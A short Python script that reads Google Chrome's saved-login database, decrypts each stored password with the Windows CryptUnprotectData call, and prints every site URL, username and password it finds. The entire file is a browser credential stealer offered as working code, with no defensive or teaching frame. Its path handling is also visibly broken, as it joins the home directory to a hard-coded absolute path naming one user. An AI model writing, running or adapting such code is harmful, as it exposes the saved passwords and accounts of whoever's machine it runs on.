# This will work when the brwser is closed.
# The pswd captured are the ones saved by the browser.

import os
# access dataase
import sqlite3 
# access pswd
import win32crypt 


def get_chrome_pswd():
    # Path to your local Chrome sq database
    data_path = os.path.expanduser('~') + r'C:\Users\POWER\AppData\Local\Google\Chrome\User Data\Default\Login Data'
    c = sqlite3.connect(data_path)
    cursor = c.cursor()

    # This will be the information grabbed & Presented
    select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
    cursor.execute(select_statement)

    login_data = cursor.fetchall()

    cred = {}

    string = ''

    for url, user_name, pwd in login_data:
        pwd = win32crypt.CryptUnprotectData(pwd)
        cred[url] = (user_name, pwd[1].decode('utf8'))

        string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url,user_name,pwd[1].decode('utf8'))
        print(string)


if __name__=='__main__':
    get_chrome_pswd()